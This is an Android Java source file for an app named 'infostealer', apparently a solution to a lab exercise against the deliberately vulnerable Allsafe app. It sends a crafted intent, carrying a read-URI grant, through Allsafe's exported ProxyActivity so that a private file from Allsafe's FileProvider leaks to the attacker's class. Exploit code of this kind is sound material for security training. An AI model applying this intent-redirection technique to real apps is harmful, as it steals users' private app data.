package com.example.infostealer;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import android.view.View;
import androidx.navigation.ui.AppBarConfiguration;
import com.example.infostealer.databinding.ActivityMainBinding;


public class MainActivity extends AppCompatActivity {

    private AppBarConfiguration appBarConfiguration;
    private ActivityMainBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void onClick(View view) {
        Intent extra = new Intent();
        extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        extra.setClassName(getPackageName(), "com.example.infostealer.Leaker");
        extra.setData(Uri.parse("content://infosecadventures.allsafe.fileprovider/files/docs/readme.txt"));

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("infosecadventures.allsafe", "infosecadventures.allsafe.ProxyActivity"));
        intent.putExtra("extra_intent", extra);
        startActivity(intent);
    }
}